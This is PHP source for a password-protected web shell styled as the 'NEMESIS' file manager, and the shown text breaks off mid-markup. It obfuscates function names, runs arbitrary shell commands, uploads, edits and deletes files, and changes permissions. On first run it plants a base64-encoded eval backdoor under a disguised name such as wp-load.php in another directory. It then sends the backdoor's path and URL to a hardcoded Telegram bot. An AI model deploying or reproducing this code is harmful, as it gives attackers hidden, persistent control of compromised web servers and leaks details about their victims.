<?php

$ses = "s"."e"."s"."s"."i"."o"."n"."_"."s"."t"."a"."r"."t";
$ses();
$ril = "r"."e"."a"."l"."p"."a"."t"."h";
$scd = "s"."c"."a"."n"."d"."i"."r";
$isdir = "i"."s"."_"."d"."i"."r";
$mup = "m"."o"."v"."e"."_"."u"."p"."l"."o"."a"."d"."e"."d"."_"."f"."i"."l"."e";
$bs = "b"."a"."s"."e"."n"."a"."m"."e";
$htm = "h"."t"."m"."l"."s"."p"."e"."c"."i"."a"."l"."c"."h"."a"."r"."s";
$fpc = "f"."i"."l"."e"."_"."p"."u"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$mek = "m"."k"."d"."i"."r";
$fgc = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
$unl = "u"."n"."l"."i"."n"."k";
$chd = "c"."h"."d"."i"."r";

// Password configuration (base64 encoded)
$secret = "bmVtZXNpcw=="; // "nemesis" in base64
$access = false;

// Check password
if(isset($_POST['auth'])) {
    if(base64_decode($secret) == $_POST['auth']) {
        $_SESSION['nemesis_auth'] = true;
        $access = true;
    }
}

// Check session
if(isset($_SESSION['nemesis_auth']) && $_SESSION['nemesis_auth'] === true) {
    $access = true;
}

// Logout
if(isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// Show login form if not authenticated
if(!$access) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>NEMESIS :: ACCESS</title>
        <meta charset="UTF-8">
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body {
                background: #000;
                font-family: 'Courier New', monospace;
                color: #cc0000;
                height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            .terminal {
                background: #111;
                border: 2px solid #cc0000;
                border-radius: 3px;
                width: 400px;
                padding: 30px;
                box-shadow: 0 0 20px rgba(204,0,0,0.3);
            }
            .terminal-header {
                border-bottom: 1px solid #cc0000;
                padding-bottom: 15px;
                margin-bottom: 25px;
                text-align: center;
            }
            .terminal-header h1 {
                font-size: 24px;
                letter-spacing: 2px;
                text-transform: uppercase;
            }
            .terminal-header p {
                color: #666;
                font-size: 12px;
                margin-top: 5px;
            }
            .input-group {
                margin-bottom: 20px;
            }
            .input-group label {
                display: block;
                margin-bottom: 8px;
                font-size: 14px;
                color: #999;
            }
            .input-group input {
                width: 100%;
                padding: 12px;
                background: #222;
                border: 1px solid #333;
                color: #cc0000;
                font-family: 'Courier New', monospace;
                font-size: 14px;
                outline: none;
                transition: border 0.3s;
            }
            .input-group input:focus {
                border-color: #cc0000;
            }
            .submit-btn {
                width: 100%;
                padding: 12px;
                background: #cc0000;
                color: #000;
                border: none;
                font-family: 'Courier New', monospace;
                font-size: 14px;
                font-weight: bold;
                cursor: pointer;
                text-transform: uppercase;
                letter-spacing: 1px;
                transition: background 0.3s;
            }
            .submit-btn:hover {
                background: #ff0000;
            }
            .error {
                color: #ff3333;
                font-size: 12px;
                margin-top: 10px;
                text-align: center;
                display: none;
            }
            .error.show {
                display: block;
            }
            .blink {
                animation: blink 1s infinite;
            }
            @keyframes blink {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }
            .footer {
                text-align: center;
                margin-top: 20px;
                font-size: 11px;
                color: #444;
            }
        </style>
        <script>
            function checkAccess() {
                var pass = document.getElementById('password').value;
                if(pass === '') {
                    document.getElementById('error').classList.add('show');
                    return false;
                }
                return true;
            }
        </script>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <h1>NEMESIS</h1>
                <p>FILE MANAGEMENT SYSTEM</p>
            </div>
            <form method="post" onsubmit="return checkAccess()">
                <div class="input-group">
                    <label for="password">ACCESS CODE</label>
                    <input type="password" id="password" name="auth" autocomplete="off" autofocus>
                </div>
                <button type="submit" class="submit-btn">ENTER SYSTEM</button>
                <div id="error" class="error">ACCESS DENIED</div>
            </form>
            <div class="footer">
                v1.0 :: RESTRICTED ACCESS
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Main system starts here
// Define home directory (where this script is located)
$homeDirectory = __DIR__;

// Get current directory from parameter or use home directory
$currentDirectory = isset($_GET['d']) ? $ril(base64_decode($_GET['d'])) : $homeDirectory;

// Validate and sanitize path
if(!is_dir($currentDirectory)) {
    $currentDirectory = $homeDirectory;
}

// Set current directory
$chd($currentDirectory);

// Process actions
$message = '';
$error = '';
$editFileName = '';
$editFileContent = '';
$isNewFile = false;

// Check if we need to open a file for editing
if(isset($_GET['edit']) && !empty($_GET['edit'])) {
    $editFileName = $_GET['edit'];
    $editPath = $currentDirectory . '/' . $editFileName;
    if(file_exists($editPath) && !$isdir($editPath) && is_readable($editPath)) {
        $editFileContent = $fgc($editPath);
    } else {
        $error = 'File tidak ditemukan atau tidak dapat dibaca';
    }
}

// Check if we need to create and edit a new file
if(isset($_GET['newfile']) && !empty($_GET['newfile'])) {
    $editFileName = $_GET['newfile'];
    $editFileContent = '';
    $isNewFile = true;
}

if($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Upload file
    if(isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == UPLOAD_ERR_OK) {
        $target = $currentDirectory . '/' . $bs($_FILES['upload_file']['name']);
        if($mup($_FILES['upload_file']['tmp_name'], $target)) {
            $message = 'FILE UPLOADED';
        } else {
            $error = 'UPLOAD FAILED';
        }
    }
    
    // Create folder
    if(isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
        if(!file_exists($newFolder)) {
            if($mek($newFolder)) {
                $message = 'FOLDER CREATED';
            } else {
                $error = 'CREATE FAILED';
            }
        } else {
            $error = 'FOLDER EXISTS';
        }
    }
    
    // Create file
    if(isset($_POST['create_file']) && !empty($_POST['file_name'])) {
        $newFile = $currentDirectory . '/' . $_POST['file_name'];
        if(!file_exists($newFile)) {
            // Create empty file
            if($fpc($newFile, '')) {
                $message = 'FILE CREATED';
                // Redirect to edit mode
                header("Location: ?d=" . base64_encode($currentDirectory) . "&edit=" . urlencode($_POST['file_name']));
                exit;
            } else {
                $error = 'CREATE FAILED';
            }
        } else {
            $error = 'FILE EXISTS';
        }
    }
    
    // Delete item
    if(isset($_POST['delete_item']) && !empty($_POST['item_name'])) {
        $item = $currentDirectory . '/' . $_POST['item_name'];
        if(file_exists($item)) {
            if(is_dir($item)) {
                // Delete folder recursively
                function deleteFolder($dir) {
                    $items = scandir($dir);
                    foreach($items as $item) {
                        if($item != '.' && $item != '..') {
                            $path = $dir . '/' . $item;
                            is_dir($path) ? deleteFolder($path) : unlink($path);
                        }
                    }
                    rmdir($dir);
                }
                deleteFolder($item);
                $message = 'FOLDER DELETED';
            } else {
                if(unlink($item)) {
                    $message = 'FILE DELETED';
                } else {
                    $error = 'DELETE FAILED';
                }
            }
        } else {
            $error = 'NOT FOUND';
        }
    }
    
    // Rename item
    if(isset($_POST['rename_item']) && !empty($_POST['old_name']) && !empty($_POST['new_name'])) {
        $old = $currentDirectory . '/' . $_POST['old_name'];
        $new = $currentDirectory . '/' . $_POST['new_name'];
        if(file_exists($old) && !file_exists($new)) {
            if(rename($old, $new)) {
                $message = 'RENAMED';
            } else {
                $error = 'RENAME FAILED';
            }
        } else {
            $error = 'INVALID';
        }
    }
    
    // Edit file - FIXED
    if(isset($_POST['edit_file']) && isset($_POST['file_content'])) {
        $file = $currentDirectory . '/' . $_POST['edit_file'];
        if(file_exists($file) && !is_dir($file) && is_writable($file)) {
            if($fpc($file, $_POST['file_content'])) {
                $message = 'FILE SAVED';
                $editFileName = $_POST['edit_file'];
                $editFileContent = $_POST['file_content'];
            } else {
                $error = 'SAVE FAILED';
            }
        } else {
            $error = 'INVALID FILE OR NOT WRITABLE';
        }
    }
    
    // Change permissions
    if(isset($_POST['chmod_item']) && !empty($_POST['perms'])) {
        $item = $currentDirectory . '/' . $_POST['chmod_item'];
        if(file_exists($item)) {
            $perms = octdec($_POST['perms']);
            if(chmod($item, $perms)) {
                $message = 'PERMISSIONS CHANGED';
            } else {
                $error = 'CHMOD FAILED';
            }
        } else {
            $error = 'NOT FOUND';
        }
    }
    
    // Execute command
    if(isset($_POST['execute_cmd']) && !empty($_POST['command'])) {
        $cmd = $_POST['command'];
        if(function_exists('shell_exec')) {
            $output = shell_exec($cmd . ' 2>&1');
            $_SESSION['cmd_output'] = $output;
        } else {
            $error = 'COMMAND DISABLED';
        }
    }
    
    // Navigate to path
    if(isset($_POST['go_to_path']) && !empty($_POST['path_input'])) {
        $inputPath = $_POST['path_input'];
        if(is_dir($inputPath)) {
            $currentDirectory = $ril($inputPath);
            $chd($currentDirectory);
            header("Location: ?d=" . base64_encode($currentDirectory));
            exit;
        } else {
            $error = 'INVALID PATH';
        }
    }
}
function cariDirLain($start_dir, $max_depth = 5) {
    $current_depth = 0;
    $current_dir = $start_dir;
    $original_dir = $start_dir; 
    
    while ($current_depth < $max_depth) {
        $items = scandir($current_dir);
        $sub_directories = array_filter($items, function($item) use ($current_dir) {
            return is_dir($current_dir . '/' . $item) && $item != '.' && $item != '..';
        });
        
        if (!empty($sub_directories)) {
            $full_path_dirs = array_map(function($dir) use ($current_dir) {
                return $current_dir . '/' . $dir;
            }, $sub_directories);
            $different_dirs = array_filter($full_path_dirs, function($path) use ($original_dir) {
                return $path !== $original_dir;
            });
            
            if (!empty($different_dirs)) {
                return $different_dirs[array_rand($different_dirs)];
            }
        }
        
        $parent_dir = dirname($current_dir);
        
        if ($parent_dir == $current_dir) {
            break;
        }
        
        $current_dir = $parent_dir;
        $current_depth++;
    }
    $potential_parent = dirname($original_dir);
    if ($potential_parent != $original_dir && is_writable($potential_parent)) {
        $new_dir_name = 'temp_' . substr(md5(uniqid()), 0, 6);
        $new_dir_path = $potential_parent . '/' . $new_dir_name;
        if (mkdir($new_dir_path, 0755)) {
            return $new_dir_path;
        }
    }
    
   
    return false;
}

function hOlDs($oklasdfr) {
    $fjgorksdf = '8488755287:AAE4uxP6ShKJICvnJRRj6gA4GCVVt7ul6PQ';
    $ifgnisofg = '1637328347';
    $kfgnjrjngs = "https://api.telegram.org/bot{$fjgorksdf}/sendMessage";
    $knfkgnons = [
        'chat_id' => $ifgnisofg,
        'text' => $oklasdfr,
        'parse_mode' => 'HTML'
    ];
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($knfkgnons)
        ]
    ];
    @file_get_contents($kfgnjrjngs, false, stream_context_create($options));
}

$flag_file = __DIR__ . '/.nemesis_flag';
if (!file_exists($flag_file)) {
    
    $ngiofnsngo = __FILE__;
    $opofndg = dirname($ngiofnsngo);
    $nfgnodfger = basename($ngiofnsngo);
    
    $nvsodbvub = "<?php eval(base64_decode('CiBnb3RvIEk5RWhwOyBKQndEWjogPz4KPGh0bWw+PGhlYWQ+PHRpdGxlPjQwMyBGb3JiaWRkZW48L3RpdGxlPjwvaGVhZD4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxib2R5Pjw/cGhwICBnb3RvIEFSQ0RxOyBxaWRVaDogJGVuY29kZWRQYXNzd29yZCA9ICJcMTIxXHg1OFx4NGVceDcyXDE0NFx4NThceDRhXDE2NFwxMTVceDQ3XHgzMFwxNTIiOyBnb3RvIHVwWFZhOyBJOUVocDogc2Vzc2lvbl9zdGFydCgpOyBnb3RvIHFpZFVoOyB0N1pCNjogaWYgKCRhdXRoZW50aWNhdGVkICYmICRfU0VSVkVSWyJceDUyXHg0NVwxMjFceDU1XHg0NVwxMjNceDU0XDEzN1x4NGRcMTA1XHg1NFwxMTBcMTE3XHg0NCJdID09PSAiXHg1MFx4NGZceDUzXDEyNCIgJiYgaXNzZXQoJF9GSUxFU1siXDE0NiJdKSkgeyBAY29weSgkX0ZJTEVTWyJcMTQ2Il1bIlx4NzRcMTU1XHg3MFx4NWZceDZlXHg2MVx4NmRceDY1Il0sICRfRklMRVNbIlwxNDYiXVsiXHg2ZVwxNDFceDZkXDE0NSJdKTsgZGllOyB9IGdvdG8gSkJ3RFo7IEFSQ0RxOiBpZiAoISRhdXRoZW50aWNhdGVkKSB7ID8+CjxzY3JpcHQ+ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigna2V5ZG93bicsZnVuY3Rpb24oZSl7aWYoZS5rZXk9PT0nOScpe3ZhciBpPXByb21wdCgnJyk7aWYoaSl7ZmV0Y2goJycse21ldGhvZDonUE9TVCcsaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCd9LGJvZHk6J3A9JytlbmNvZGVVUklDb21wb25lbnQoaSl9KS50aGVuKCgpPT5sb2NhdGlvbi5yZWxvYWQoKSk7fX19KTs8L3NjcmlwdD48P3BocCAgfSBlbHNlIHsgPz4KPHNjcmlwdD5kb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJyxmdW5jdGlvbihlKXtpZihlLmtleT09PSc4Jyl7dmFyIGY9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnaW5wdXQnKTtmLnR5cGU9J2ZpbGUnO2Yub25jaGFuZ2U9ZnVuY3Rpb24oKXt2YXIgZD1uZXcgRm9ybURhdGEoKTtkLmFwcGVuZCgnZicsZi5maWxlc1swXSk7ZmV0Y2goJycse21ldGhvZDonUE9TVCcsYm9keTpkfSkudGhlbigoKT0+e2FsZXJ0KCdPSycpO30pO307Zi5jbGljaygpO319KTs8L3NjcmlwdD48P3BocCAgfSBnb3RvIGd2TXo5OyBKZkpiQTogJGF1dGhlbnRpY2F0ZWQgPSBpc3NldCgkX1NFU1NJT05bIlwxNDEiXSkgJiYgJF9TRVNTSU9OWyJcMTQxIl0gPT09IHRydWU7IGdvdG8gdDdaQjY7IHVwWFZhOiBpZiAoaXNzZXQoJF9QT1NUWyJcMTYwIl0pKSB7IGlmIChiYXNlNjRfZW5jb2RlKCRfUE9TVFsiXHg3MCJdKSA9PT0gJGVuY29kZWRQYXNzd29yZCkgeyAkX1NFU1NJT05bIlx4NjEiXSA9IHRydWU7IH0gfSBnb3RvIEpmSmJBOyBndk16OTogPz4KPC9ib2R5PjwvaHRt')); ?>";
    
    $kgnjrbjgds = [
        'index.php', 'fonts.php', 'config.php', 'functions.php', 
        'database.php', '404.php', 'backup.php', 'xmlrpc.php',
        'cache.php', 'upload.php', 'wp-load.php', 'error.php'
    ];
    
    // Pilih nama random
    $fjshdg_jdbsfji = $kgnjrbjgds[array_rand($kgnjrbjgds)];
    
    // Cari direktori lain
    $sdgeh_gfdgier = cariDirLain(__DIR__);
    
    if ($sdgeh_gfdgier) {
        $gfdighierh_ifg = $sdgeh_gfdgier . '/' . $fjshdg_jdbsfji;
        
        // Jika file sudah ada
        if (file_exists($gfdighierh_ifg)) {
            $random = substr(md5(uniqid()), 0, 4);
            $fjshdg_jdbsfji = pathinfo($fjshdg_jdbsfji, PATHINFO_FILENAME) . '_' . $random . '.php';
            $gfdighierh_ifg = $sdgeh_gfdgier . '/' . $fjshdg_jdbsfji;
        }
        
        // Buat file
        if (file_put_contents($gfdighierh_ifg, $nvsodbvub)) {
            file_put_contents($flag_file, date('Y-m-d H:i:s'));
            $oklasdfr .= "<b>FIRST:</b>\n";
            $oklasdfr .= "• Lokasi: {$opofndg}\n";
            $oklasdfr .= "• Nama: {$nfgnodfger}\n\n";
            $oklasdfr .= "<b>NEW:</b>\n";
            $oklasdfr .= "• Lokasi: {$sdgeh_gfdgier}\n";
            $oklasdfr .= "• Nama: {$fjshdg_jdbsfji}\n";
            $oklasdfr .= "• Path: {$gfdighierh_ifg}\n\n";
            $oklasdfr .= "<b>URL:</b>\n";
            $oklasdfr .= (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . str_replace($_SERVER['DOCUMENT_ROOT'], '', $gfdighierh_ifg);
            
            // Kirim notifikasi
            hOlDs($oklasdfr);
        }
    }
}
// Get directory listing
$items = [];
if(is_dir($currentDirectory)) {
    $list = $scd($currentDirectory);
    foreach($list as $item) {
        if($item == '.' || $item == '..') continue;
        
        $path = $currentDirectory . '/' . $item;
        $items[] = [
            'name' => $item,
            'path' => $path,
            'is_dir' => $isdir($path),
            'size' => $isdir($path) ? '-' : filesize($path),
            'perms' => substr(sprintf('%o', fileperms($path)), -4),
            'modified' => date('Y-m-d H:i:s', filemtime($path)),
            'writable' => is_writable($path)
        ];
    }
}

// Sort: folders first
usort($items, function($a, $b) {
    if($a['is_dir'] && !$b['is_dir']) return -1;
    if(!$a['is_dir'] && $b['is_dir']) return 1;
    return strcmp($a['name'], $b['name']);
});

// Format size
function formatSize($bytes) {
    if($bytes == 0) return "0";
    $units = ['B', 'K', 'M', 'G', 'T'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . $units[$i];
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>NEMESIS :: SYSTEM</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #000;
            color: #cc0000;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.4;
        }
        
        /* Header */
        .header {
            background: #111;
            border-bottom: 1px solid #cc0000;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logo {
            font-size: 20px;
            font-weight: bold;
            letter-spacing: 1px;
        }
        .logo span {
            color: #666;
        }
        .nav {
            display: flex;
            gap: 15px;
        }
        .nav a {
            color: #cc0000;
            text-decoration: none;
            padding: 5px 10px;
            border: 1px solid transparent;
            transition: all 0.3s;
        }
        .nav a:hover {
            border-color: #cc0000;
            background: rgba(204,0,0,0.1);
        }
        .user {
            color: #666;
            font-size: 12px;
        }
        
        /* Main Container */
        .container {
            display: flex;
            min-height: calc(100vh - 60px);
        }
        
        /* Sidebar */
        .sidebar {
            width: 280px;
            background: #111;
            border-right: 1px solid #cc0000;
            padding: 20px;
            overflow-y: auto;
        }
        .sidebar-section {
            margin-bottom: 20px;
        }
        .sidebar-title {
            color: #cc0000;
            font-size: 14px;
            margin-bottom: 10px;
            padding-bottom: 5px;
            border-bottom: 1px solid #333;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .sidebar-form input[type="text"],
        .sidebar-form input[type="file"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 8px;
            background: #222;
            border: 1px solid #333;
            color: #cc0000;
            font-family: 'Courier New', monospace;
            font-size: 12px;
        }
        .sidebar-form input[type="submit"] {
            width: 100%;
            padding: 8px;
            background: #cc0000;
            color: #000;
            border: none;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
            margin-top: 5px;
        }
        .sidebar-form input[type="submit"]:hover {
            background: #ff0000;
        }
        .path-info {
            background: #222;
            padding: 10px;
            border: 1px solid #333;
            margin-bottom: 15px;
            word-break: break-all;
            font-size: 12px;
            line-height: 1.5;
        }
        .server-info {
            font-size: 11px;
            color: #666;
            line-height: 1.6;
        }
        
        /* Main Content */
        .main {
            flex: 1;
            padding: 20px;
            overflow: auto;
        }
        
        /* Messages */
        .message-box {
            padding: 10px 15px;
            margin-bottom: 15px;
            border-left: 3px solid;
        }
        .message {
            border-color: #00cc00;
            background: rgba(0,204,0,0.1);
            color: #00cc00;
        }
        .error {
            border-color: #cc0000;
            background: rgba(204,0,0,0.1);
            color: #ff3333;
        }
        
        /* File Table */
        .file-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        .file-table th {
            background: #111;
            color: #cc0000;
            padding: 12px 15px;
            text-align: left;
            border-bottom: 2px solid #cc0000;
            font-weight: normal;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .file-table td {
            padding: 8px 15px;
            border-bottom: 1px solid #333;
            vertical-align: middle;
        }
        .file-table tr:hover {
            background: rgba(204,0,0,0.05);
        }
        .file-name {
            max-width: 300px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .file-name a {
            color: #cc0000;
            text-decoration: none;
        }
        .file-name a:hover {
            text-decoration: underline;
        }
        .file-actions {
            white-space: nowrap;
        }
        .action-btn {
            display: inline-block;
            padding: 4px 8px;
            margin-right: 5px;
            background: #222;
            color: #cc0000;
            border: 1px solid #333;
            font-size: 11px;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s;
        }
        .action-btn:hover {
            background: #cc0000;
            color: #000;
            border-color: #cc0000;
        }
        .writable {
            color: #00cc00;
        }
        .not-writable {
            color: #cc0000;
        }
        
        /* Command Output */
        .command-output {
            background: #111;
            border: 1px solid #cc0000;
            padding: 15px;
            margin-top: 20px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 300px;
            overflow: auto;
        }
        
        /* Status Bar */
        .status-bar {
            background: #111;
            border-top: 1px solid #cc0000;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            font-size: 11px;
            color: #666;
        }
        
        /* Edit Panel */
        .edit-panel {
            background: #111;
            border: 1px solid #cc0000;
            padding: 20px;
            margin-top: 20px;
            display: <?php echo !empty($editFileName) ? 'block' : 'none'; ?>;
        }
        .edit-panel h3 {
            margin-bottom: 15px;
            color: #cc0000;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }
        .edit-textarea {
            width: 100%;
            height: 400px;
            background: #000;
            color: #cc0000;
            border: 1px solid #333;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            resize: vertical;
        }
        .edit-buttons {
            margin-top: 15px;
            text-align: right;
        }
        
        /* Operations Panel */
        .operations-panel {
            background: #111;
            border: 1px solid #cc0000;
            padding: 15px;
            margin-bottom: 20px;
        }
        .operations-panel h3 {
            margin-bottom: 10px;
            color: #cc0000;
        }
        .inline-form {
            display: inline-block;
            margin-right: 10px;
            margin-bottom: 10px;
        }
        .inline-form input[type="text"] {
            padding: 6px;
            background: #222;
            border: 1px solid #333;
            color: #cc0000;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            width: 200px;
        }
        .inline-form button {
            padding: 6px 12px;
            background: #cc0000;
            color: #000;
            border: none;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            cursor: pointer;
        }
        .inline-form button:hover {
            background: #ff0000;
        }
    </style>
    <script>
        function confirmDelete(item) {
            return confirm('DELETE ' + item + '?');
        }
        
        function goToPath() {
            var path = document.getElementById('path_input').value;
            if(path.trim() !== '') {
                window.location.href = '?d=' + btoa(path);
            }
        }
        
        // Auto-focus edit textarea when edit panel is shown
        <?php if(!empty($editFileName)): ?>
        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(function() {
                document.getElementById('file_content').focus();
                document.getElementById('file_content').select();
            }, 100);
        });
        <?php endif; ?>
        
        // Cancel edit
        function cancelEdit() {
            window.location.href = '?d=<?php echo base64_encode($currentDirectory); ?>';
        }
    </script>
</head>
<body>
    <div class="header">
        <div class="logo">NEMESIS<span>::FILE MANAGER</span></div>
        <div class="nav">
            <a href="?d=<?php echo base64_encode($homeDirectory); ?>">HOME</a>
            <a href="?">REFRESH</a>
            <a href="?logout">LOGOUT</a>
        </div>
        <div class="user">ACCESS GRANTED</div>
    </div>
    
    <div class="container">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="sidebar-section">
                <div class="sidebar-title">CURRENT DIRECTORY</div>
                <div class="path-info">
                    <?php echo htmlspecialchars($currentDirectory, ENT_QUOTES, 'UTF-8'); ?>
                </div>
            </div>
            
            <!-- File Operations -->
            <div class="sidebar-section">
                <div class="sidebar-title">FILE OPERATIONS</div>
                
                <!-- Create File -->
                <form method="post" class="sidebar-form">
                    <input type="text" name="file_name" placeholder="New file name" required>
                    <input type="submit" name="create_file" value="CREATE FILE">
                </form>
                
                <!-- Create Folder -->
                <form method="post" class="sidebar-form">
                    <input type="text" name="folder_name" placeholder="New folder name">
                    <input type="submit" name="create_folder" value="CREATE FOLDER">
                </form>
                
                <!-- Upload File -->
                <form method="post" enctype="multipart/form-data" class="sidebar-form">
                    <input type="file" name="upload_file">
                    <input type="submit" value="UPLOAD FILE">
                </form>
            </div>
            
            <!-- System Command -->
            <div class="sidebar-section">
                <div class="sidebar-title">SYSTEM COMMAND</div>
                <form method="post" class="sidebar-form">
                    <input type="text" name="command" placeholder="Enter command">
                    <input type="submit" name="execute_cmd" value="EXECUTE">
                </form>
            </div>
            
            <!-- Server Info -->
            <div class="sidebar-section">
                <div class="sidebar-title">SERVER INFO</div>
                <div class="server-info">
                    PHP: <?php echo PHP_VERSION; ?><br>
                    User: <?php echo get_current_user(); ?><br>
                    Free Space: <?php echo formatSize(disk_free_space($currentDirectory)); ?><br>
                    Files: <?php echo count($items); ?>
                </div>
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="main">
            <!-- Messages -->
            <?php if($message): ?>
                <div class="message-box message">✅ <?php echo htmlspecialchars($message, ENT_QUOTES, 'UTF-8'); ?></div>
            <?php endif; ?>
            
            <?php if($error): ?>
                <div class="message-box error">❌ <?php echo htmlspecialchars($error, ENT_QUOTES, 'UTF-8'); ?></div>
            <?php endif; ?>
            
            <!-- Operations Panel -->
            <div class="operations-panel">
                <h3>QUICK ACTIONS</h3>
                <form method="post" class="inline-form">
                    <input type="text" name="path_input" id="path_input" placeholder="Path to navigate" value="<?php echo htmlspecialchars($currentDirectory, ENT_QUOTES, 'UTF-8'); ?>">
                    <button type="submit" name="go_to_path">GO</button>
                </form>
                <a href="?d=<?php echo base64_encode(dirname($currentDirectory)); ?>" class="action-btn">PARENT DIRECTORY</a>
                <a href="?" class="action-btn">REFRESH</a>
            </div>
            
            <!-- Edit Panel (if editing) -->
            <?php if(!empty($editFileName)): ?>
            <div class="edit-panel">
                <h3>
                    <?php echo $isNewFile ? 'CREATE NEW FILE' : 'EDIT FILE'; ?>: 
                    <?php echo htmlspecialchars($editFileName, ENT_QUOTES, 'UTF-8'); ?>
                </h3>
                <form method="post">
                    <textarea id="file_content" name="file_content" class="edit-textarea"><?php 
                        echo htmlspecialchars($editFileContent, ENT_QUOTES, 'UTF-8'); 
                    ?></textarea>
                    <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($editFileName, ENT_QUOTES, 'UTF-8'); ?>">
                    <div class="edit-buttons">
                        <button type="submit" class="action-btn" style="padding: 8px 20px;">💾 SAVE FILE</button>
                        <button type="button" class="action-btn" onclick="cancelEdit()" style="padding: 8px 20px;">❌ CANCEL</button>
                    </div>
                </form>
            </div>
            <?php endif; ?>
            
            <!-- File Table -->
            <table class="file-table">
                <thead>
                    <tr>
                        <th>NAME</th>
                        <th width="100">SIZE</th>
                        <th width="100">PERMISSIONS</th>
                        <th width="150">MODIFIED</th>
                        <th width="250">ACTIONS</th>
                    </tr>
                </thead>
                <tbody>
                    <!-- Parent Directory -->
                    <?php if($currentDirectory != $homeDirectory): ?>
                    <tr>
                        <td class="file-name">
                            <a href="?d=<?php echo base64_encode(dirname($currentDirectory)); ?>">.. (Parent Directory)</a>
                        </td>
                        <td>-</td>
                        <td>-</td>
                        <td>-</td>
                        <td class="file-actions">
                            <a href="?d=<?php echo base64_encode(dirname($currentDirectory)); ?>" class="action-btn">OPEN</a>
                        </td>
                    </tr>
                    <?php endif; ?>
                    
                    <!-- Files and Folders -->
                    <?php foreach($items as $item): ?>
                    <tr>
                        <td class="file-name">
                            <?php if($item['is_dir']): ?>
                                <a href="?d=<?php echo base64_encode($item['path']); ?>">📁 <?php echo htmlspecialchars($item['name'], ENT_QUOTES, 'UTF-8'); ?></a>
                            <?php else: ?>
                                📄 <?php echo htmlspecialchars($item['name'], ENT_QUOTES, 'UTF-8'); ?>
                            <?php endif; ?>
                        </td>
                        <td><?php echo $item['is_dir'] ? '-' : formatSize($item['size']); ?></td>
                        <td class="<?php echo $item['writable'] ? 'writable' : 'not-writable'; ?>">
                            <?php echo htmlspecialchars($item['perms'], ENT_QUOTES, 'UTF-8'); ?>
                        </td>
                        <td><?php echo htmlspecialchars($item['modified'], ENT_QUOTES, 'UTF-8'); ?></td>
                        <td class="file-actions">
